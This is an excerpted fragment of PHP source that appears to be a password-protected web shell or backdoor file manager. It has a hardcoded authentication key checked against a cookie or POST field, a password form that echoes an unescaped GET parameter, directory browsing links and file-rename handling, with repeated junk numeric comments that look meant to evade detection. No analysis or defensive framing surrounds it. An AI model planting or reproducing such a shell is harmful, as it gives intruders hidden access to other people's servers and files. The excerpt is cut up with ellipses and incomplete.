...
$auth_key = "488397147df0115b604de77c33aef81e";
...
$pass = false;
if (isset($_COOKIE['pw_name_27274'])) {
    if(($_COOKIE['pw_name_27274']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_27274'])) {
        if(($_POST['pw_name_27274']) == $auth_key) {
            setcookie("pw_name_27274", $_POST['pw_name_27274']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_27274' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724018475802458 1724018475660315 1724018475132072 1724018475742405
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724018475802458 1724018475660315 1724018475132072 1724018475742405
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724018475802458 1724018475660315 1724018475132072 1724018475742405
            $name = PATH . "/" . $_GET['r'];
